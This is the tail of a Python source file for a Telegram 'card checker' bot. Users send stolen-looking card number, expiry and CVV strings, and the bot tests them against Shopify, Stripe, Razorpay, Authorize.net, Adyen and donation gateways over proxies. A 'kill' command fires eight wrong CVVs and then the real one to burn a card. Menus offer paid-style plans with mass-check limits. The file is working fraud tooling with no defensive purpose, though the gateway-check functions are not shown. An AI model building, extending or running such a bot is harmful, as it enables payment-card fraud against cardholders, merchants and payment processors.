        "🐉 **Welcome Lenin** »\n"
        "This bot promises you fast and safe checkups with different gateways! 🚀\n\n"
        "🤖 Bot Dev 🐉 Rift 🐉\n"
        "📦 Version 🐉 2.0 (Constantly Upgrading...)"
    )
    keyboard = [
        [InlineKeyboardButton("🚪 GATES", callback_data='main_gates')],
        [InlineKeyboardButton("👤 ACCOUNT", callback_data='main_account')],
        [InlineKeyboardButton("🛠 TOOLS", callback_data='main_tools')],
        [InlineKeyboardButton("❌ CLOSE", callback_data='main_close')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    try:
        with open("dragon.jpg", "rb") as photo:
            await update.message.reply_photo(photo, caption=caption, parse_mode='Markdown', reply_markup=reply_markup)
    except:
        await update.message.reply_text(caption, parse_mode='Markdown', reply_markup=reply_markup)

async def account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = (
        f"👤 **User Info**\n"
        f"• Name: {user.first_name}\n"
        f"• ID: {user.id}\n"
        f"• Plan: Pro\n"
        f"• Mass Limit: 5000\n"
        f"• Private Access: On\n"
        f"• Plan Expires: 2126-05-06\n"
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'main_gates':
        keyboard = [
            [InlineKeyboardButton("🛒 Shopify", callback_data='gate_shopify')],
            [InlineKeyboardButton("⚡ Stripe", callback_data='gate_stripe')],
            [InlineKeyboardButton("🪙 Razorpay", callback_data='gate_razorpay')],
            [InlineKeyboardButton("🏦 Authorize", callback_data='gate_authorize')],
            [InlineKeyboardButton("❤️ Donation", callback_data='gate_donation')],
            [InlineKeyboardButton("🔷 Adyen", callback_data='gate_adyen')],
            [InlineKeyboardButton("💀 KILL", callback_data='gate_kill')],
            [InlineKeyboardButton("🔍 CHECK", callback_data='gate_check')],
            [InlineKeyboardButton("⬅️ BACK", callback_data='main_back')],
        ]
        await query.edit_message_caption(
            caption="🔽 **Select a gateway**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    elif data == 'main_account':
        user = update.effective_user
        text = f"👤 *User Info*\n• Name: {user.first_name}\n• ID: {user.id}\n• Plan: Pro\n• Mass Limit: 5000\n• Private Access: On\n• Plan Expires: 2126-05-06"
        await query.edit_message_caption(
            caption=text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data='main_back')]]),
            parse_mode='Markdown'
        )
    elif data == 'main_tools':
        await query.edit_message_caption(
            caption="🛠 Tools coming soon...",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data='main_back')]])
        )
    elif data == 'main_close':
        await query.edit_message_caption(caption="👋 Closed. Use /start to reopen.")
    elif data == 'main_back':
        caption = (
            "🐉 **Welcome Lenin** »\n"
            "This bot promises you fast and safe checkups with different gateways! 🚀\n\n"
            "🤖 Bot Dev 🐉 Rift 🐉\n"
            "📦 Version 🐉 2.0 (Constantly Upgrading...)"
        )
        keyboard = [
            [InlineKeyboardButton("🚪 GATES", callback_data='main_gates')],
            [InlineKeyboardButton("👤 ACCOUNT", callback_data='main_account')],
            [InlineKeyboardButton("🛠 TOOLS", callback_data='main_tools')],
            [InlineKeyboardButton("❌ CLOSE", callback_data='main_close')],
        ]
        await query.edit_message_caption(
            caption=caption,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    elif data.startswith('gate_'):
        gateway = data.replace('gate_', '')
        await query.edit_message_caption(
            caption=f"Send card in format: `/{gateway} card|month|year|cvv`\nExample: `/{gateway} 4111111111111111|12|2026|123`",
            parse_mode='Markdown'
        )
    else:
        await query.edit_message_caption(caption="Unknown option")

# Generic gateway command
async def gateway_command(update: Update, context: ContextTypes.DEFAULT_TYPE, gateway_name: str):
    if not context.args:
        await update.message.reply_text(f"❌ Use: /{gateway_name} card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error. Example: `/{gateway_name} 4111111111111111|12|2026|123`")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text(f"⚡ Checking {gateway_name.upper()}...")
    if gateway_name == 'shopify':
        status, msg, live = await shopify_check(card, month, year, cvv)
    elif gateway_name == 'stripe':
        status, msg, live = await stripe_check(card, month, year, cvv)
    elif gateway_name == 'razorpay':
        status, msg, live = await razorpay_check(card, month, year, cvv)
    elif gateway_name == 'authorize':
        status, msg, live = await authorize_check(card, month, year, cvv)
    elif gateway_name == 'donation':
        status, msg, live = await authorize_check(card, month, year, cvv)
    elif gateway_name == 'adyen':
        status, msg, live = await adyen_check(card, month, year, cvv)
    else:
        status, msg, live = ("❌ ERROR", "Unknown gateway", None)
    emoji = "✅" if live is True else "❌" if live is False else "⚠️"
    await update.message.reply_text(f"{emoji} **{status}**\n{msg}")

async def shopify_cmd(update, context): await gateway_command(update, context, 'shopify')
async def stripe_cmd(update, context): await gateway_command(update, context, 'stripe')
async def razorpay_cmd(update, context): await gateway_command(update, context, 'razorpay')
async def authorize_cmd(update, context): await gateway_command(update, context, 'authorize')
async def donation_cmd(update, context): await gateway_command(update, context, 'donation')
async def adyen_cmd(update, context): await gateway_command(update, context, 'adyen')

# Kill & Check
async def kill_cmd(update, context):
    if not context.args:
        await update.message.reply_text("❌ Use: /kill card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error.")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text("💀 Killing card (8 wrong CVV + 1 correct)...")
    wrong = set()
    while len(wrong) < 8:
        w = str(random.randint(100,999)).zfill(3)
        if w != cvv:
            wrong.add(w)
    attempts = list(wrong) + [cvv]
    results = []
    for attempt_cvv in attempts:
        status, msg, live = await authorize_check(card, month, year, attempt_cvv)
        results.append(f"CVV {attempt_cvv}: {status} - {msg}")
        await asyncio.sleep(1)
    report = "\n".join(results)
    await update.message.reply_text(f"✅ Done.\n\n{report}")

async def check_cmd(update, context):
    if not context.args:
        await update.message.reply_text("❌ Use: /check card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error.")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text("🔍 Checking card...")
    status, msg, live = await authorize_check(card, month, year, cvv)
    emoji = "✅" if live is True else "❌" if live is False else "⚠️"
    await update.message.reply_text(f"{emoji} **{status}**\n{msg}")

# ================= MAIN =================
def main():
    load_proxies()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("account", account))
    app.add_handler(CommandHandler("shopify", shopify_cmd))
    app.add_handler(CommandHandler("stripe", stripe_cmd))
    app.add_handler(CommandHandler("razorpay", razorpay_cmd))
    app.add_handler(CommandHandler("authorize", authorize_cmd))
    app.add_handler(CommandHandler("donation", donation_cmd))
    app.add_handler(CommandHandler("adyen", adyen_cmd))
    app.add_handler(CommandHandler("kill", kill_cmd))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
